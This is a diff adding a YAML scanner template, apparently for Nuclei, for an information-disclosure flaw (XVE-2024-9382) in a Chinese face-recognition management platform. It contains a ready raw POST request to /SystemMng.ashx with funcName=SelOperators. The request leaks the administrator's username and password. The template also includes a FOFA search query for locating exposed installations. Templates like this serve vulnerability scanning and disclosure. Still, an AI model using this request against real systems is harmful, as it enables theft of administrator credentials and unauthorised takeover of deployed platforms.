@@ -1,0 +1,35 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - username
+            - password
+            - '"rows": "[{'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /SystemMng.ashx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          username=admin&funcName=SelOperators
+id: lianaiyun-SystemMng-Information-disclosure
+info:
+    author: Superhero
+    description: |-
+        fofa: body="View/UserReserved/UserReservedTest.aspx"
+        脸爱云一脸通智慧管理平台存在信息泄露漏洞，该漏洞源于SystemMng.ashx接口处存在信息泄露漏洞，攻击者能够利用该漏洞通过SelOperators参数泄露的当前管理员的敏感信息，包括账号密码登录系统后台。
+    name: 脸爱云一脸通智慧管理平台 SystemMng 管理用户信息泄露漏洞(XVE-2024-9382)
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484636&idx=1&sn=42edc010dceca4c2abf5b7897119fff4&chksm=c267b1eff51038f935a7487a21231ac130214813dbc105b72cb539d502f2c8f2643890a46331&token=1439003696&lang=zh_CN#rd
+    severity: high
+    tags:
+        - Information disclosure
+        - Eserv
+        - 脸爱云一脸通智慧管理平台
+        - eserv
